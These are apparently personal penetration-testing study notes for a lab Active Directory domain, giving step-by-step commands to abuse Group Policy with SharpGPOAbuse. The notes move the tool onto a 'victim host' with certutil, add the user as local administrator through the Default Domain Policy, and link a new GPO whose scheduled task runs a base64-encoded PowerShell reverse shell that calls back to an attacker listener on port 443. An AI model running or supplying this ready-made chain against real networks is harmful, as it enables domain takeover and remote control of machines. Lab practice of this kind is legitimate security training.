https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master?source=post_page-----158516460860---------------------------------------
## Method : Add ourself as Local Administrator & forcing a policy update

```
wget https://github.com/byronkg/SharpGPOAbuse/raw/refs/heads/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
```

Host server with SharpGPOAbuse.exe
```
cp ~/Desktop/Tools/Windows/SharpGPOAbuse.exe . && python -m http.server 80
```

Transfer into VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpGPOAbuse.exe SharpGPOAbuse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
On VICTIM HOST

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName "Default Domain Policy"
```

[[[PowerView.ps1]]]

Then force policy update
```
gpupdate /force
```

---

![[Pasted image 20260817211312.png]]

This will add our account into localgroup administrators

---

# WriteGPLink

Host server with SharpGPOAbuse.exe
```
cp ~/Desktop/Tools/Windows/SharpGPOAbuse.exe . && python -m http.server 80
```

Transfer into VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpGPOAbuse.exe SharpGPOAbuse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
List all existing GPOs
```
Get-GPO -all
```

Dont mess with those, make my own one
```
New-GPO -name "Retric"
```

Link the GPO to the computer
```
New-GPLink -Name "Retric" -target "DC=frizz,DC=htb"
```

Execute SharpGPOAbuse.exe
```
.\SharpGPOAbuse.exe --addcomputertask --GPOName "Retric" --Author "Retric" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\Desktop\test"
```

Propagate the GPO
```
gpupdate /force
```

```
cat test
```

![[Pasted image 20260918002441.png]]

After it works, use a clean GPO for another command

```
New-GPO -name "retric.rev"
```

```
New-GPLink -Name "retric.rev" -target "DC=frizz,DC=htb"
```

https://shellgenerator.dev/

OS > Windows
Shell > Powershell.exe
Payload selection > Powershell
Powershell #3 base64

```
.\SharpGPOAbuse.exe --addcomputertask --GPOName "retric.rev" --Author "Retric" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AOQA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

```
GPupdate /force
```

```
cp ~/Desktop/Tools/penelope.py . && python3 penelope.py -p 443
```